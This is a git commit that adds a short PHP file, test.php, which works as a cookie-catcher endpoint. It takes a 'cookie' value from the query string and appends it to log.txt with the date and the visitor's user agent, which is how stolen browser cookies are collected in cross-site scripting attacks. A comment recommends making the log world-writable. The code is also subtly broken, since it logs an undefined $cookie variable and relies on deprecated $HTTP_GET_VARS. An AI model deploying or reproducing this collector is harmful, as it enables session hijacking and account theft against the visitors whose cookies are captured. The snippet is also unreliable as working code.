bb9a24c24a20c0270e2ab70dfba36582c557c8fa
TestName{UFO} <36362763+testufo@users.noreply.github.com>
2020-10-19 15:43:43 +0300

    Create test.php

---
+++ test.php
@@ -0,0 +1,8 @@
+<?php
+$collectedCookie=$HTTP_GET_VARS["cookie"];
+$date=date("l ds of F Y h:i:s A");
+$user_agent=$_SERVER['HTTP_USER_AGENT'];
+$file=fopen('log.txt','a'); // chmod 777 log.txt
+fwrite($file,"DATE:$date || USER AGENT:$user_agent || COOKIE:$cookie \n");
+fclose($file);
+?>
